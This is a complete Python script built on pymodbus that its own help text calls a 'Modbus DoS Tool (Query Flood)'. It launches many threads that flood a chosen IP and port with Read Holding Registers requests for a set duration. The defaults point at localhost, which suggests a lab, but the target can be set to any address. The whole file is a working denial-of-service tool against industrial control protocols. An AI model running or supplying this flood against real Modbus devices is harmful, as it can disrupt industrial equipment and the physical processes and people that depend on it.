
import sys
import time
import socket
import argparse
import threading
from pymodbus.client import ModbusTcpClient

# Global flag to stop the threads
stop_threads = False

def flood_modbus(target_ip, target_port, duration):
    """Flood the target with Modbus Read Holding Registers requests."""
    client = ModbusTcpClient(target_ip, port=target_port)
    start_time = time.time()
    packet_count = 0
    
    try:
        if not client.connect():
            print(f"[-] Thread {threading.get_ident()}: Failed to connect to {target_ip}:{target_port}")
            return

        while time.time() - start_time < duration and not stop_threads:
            # Send a Read Holding Registers request (Function 03)
            # Try multiple signatures for compatibility
            try:
                rr = client.read_holding_registers(address=0, count=10, slave=1)
            except TypeError:
                try:
                    rr = client.read_holding_registers(0, 10, unit=1)
                except TypeError:
                    rr = client.read_holding_registers(0, 10)
            packet_count += 1
            # Optional: Add a tiny sleep to prevent self-DoS if the client becomes the bottleneck
            # time.sleep(0.001)

        client.close()
    except Exception as e:
        print(f"[-] Thread {threading.get_ident()}: Error during flood: {e}")
    
    print(f"[+] Thread {threading.get_ident()}: Sent {packet_count} packets.")

def run_dos(target_ip, target_port, duration, threads):
    """Launch multi-threaded DoS attack."""
    print(f"[*] Starting Modbus Query Flood against {target_ip}:{target_port}")
    print(f"[*] Duration: {duration} seconds | Threads: {threads}")

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood_modbus, args=(target_ip, target_port, duration))
        thread_list.append(t)
        t.start()

    # Wait for threads to finish
    for t in thread_list:
        t.join()

    print("[*] Attack Finished.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Modbus DoS Tool (Query Flood)")
    parser.add_argument("--target", default="localhost", help="Target IP address (default: localhost)")
    parser.add_argument("--port", type=int, default=5002, help="Target Port (default: 5002)")
    parser.add_argument("--duration", type=int, default=10, help="Duration of attack in seconds (default: 10)")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")

    args = parser.parse_args()

    try:
        run_dos(args.target, args.port, args.duration, args.threads)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user.")
        stop_threads = True
